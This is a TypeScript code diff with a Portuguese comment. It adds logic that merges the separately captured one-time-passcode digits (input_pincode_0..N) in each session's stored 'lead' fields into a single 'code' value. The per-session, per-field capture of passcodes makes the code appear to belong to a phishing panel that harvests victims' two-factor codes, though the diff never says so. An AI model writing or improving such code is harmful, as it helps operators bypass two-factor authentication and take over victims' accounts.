@@ -77,6 +77,22 @@ function groupBySession(rows: LeadRow[]): SessionGroup[] {
       g.fields[r.field_name] = { value: r.value, updated_at: r.created_at };
     }
   }
+  // Agregar dígitos do código OTP (input_pincode_0..N) em um único campo "code"
+  for (const g of map.values()) {
+    const pinEntries = Object.entries(g.fields)
+      .filter(([k]) => /^input_?pincode[_-]?\d+$/i.test(k) || /^pincode[_-]?\d+$/i.test(k))
+      .sort(([a], [b]) => {
+        const na = parseInt(a.match(/(\d+)$/)?.[1] ?? "0", 10);
+        const nb = parseInt(b.match(/(\d+)$/)?.[1] ?? "0", 10);
+        return na - nb;
+      });
+    if (pinEntries.length > 0) {
+      const combined = pinEntries.map(([, v]) => v.value || "").join("");
+      const latest = pinEntries.reduce((acc, [, v]) => (v.updated_at > acc ? v.updated_at : acc), pinEntries[0][1].updated_at);
+      for (const [k] of pinEntries) delete g.fields[k];
+      if (combined) g.fields.code = { value: combined, updated_at: latest };
+    }
+  }
   return Array.from(map.values()).sort((a, b) => (a.last_seen < b.last_seen ? 1 : -1));
 }
 
